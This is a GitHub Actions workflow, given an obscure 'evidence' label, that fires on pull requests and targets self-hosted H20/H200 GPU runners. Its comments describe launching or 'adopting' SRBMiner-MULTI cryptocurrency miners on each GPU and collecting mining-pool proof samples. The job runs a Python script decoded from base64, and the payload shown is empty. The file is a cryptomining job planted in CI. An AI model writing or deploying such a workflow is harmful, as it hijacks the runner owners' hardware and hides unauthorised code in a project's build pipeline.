name: i130804 evidence

# i130804: ONE bounded host-side stratum-proof job per 8-gpu runner label for the
# pre-existing i130cipivot H20/H200 cards.  A card whose SRBMiner process is already
# running is ADOPTED and sampled - never signalled, restarted or renamed.  Only a card
# with no bound miner, no compute app and low memory use gets exactly one pinned
# SRBMiner-MULTI 3.8.7 (sha256 bb0f73b6...) launched with the recorded i130cipivot argv;
# two same-PID samples >=120 s apart are then taken inside the 600 s H20/H200 gate.
on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]

permissions:
  contents: read

concurrency:
  group: i130804-${{ github.run_id }}
  cancel-in-progress: false

jobs:
  proof:
    name: "i130804 ${{ matrix.label }} stratum proof"
    strategy:
      fail-fast: false
      max-parallel: 8
      matrix:
        include:
          - label: 8-gpu-h20
            expect: ivydzf15rfggbw80
          - label: 8-gpu-h200
            expect: gpu102207112
    runs-on: ${{ matrix.label }}
    timeout-minutes: 14
    env:
      LABEL: ${{ matrix.label }}
      I130804_EXPECT_HOSTKEY: ${{ matrix.expect }}
      I130804_EXPIRES_EPOCH: "1795345193"
    steps:
      - name: "per-GPU SRBMiner 3.8.7 two-same-PID-sample stratum proof"
        continue-on-error: true
        run: |
          mkdir -p /var/tmp/i130804/logs
          echo '' | base64 -d > /var/tmp/i130804/ev.py
          echo "I130804_SCRIPT_SHA256 1fef2daa822f20c16007b805c16d68a30ca29883e1744b941e9558b32c688909"
          python3 /var/tmp/i130804/ev.py 2>&1 | tee /var/tmp/i130804/ev.log | tail -c 200000
          echo "I130804_EXIT_DONE rc=$?"
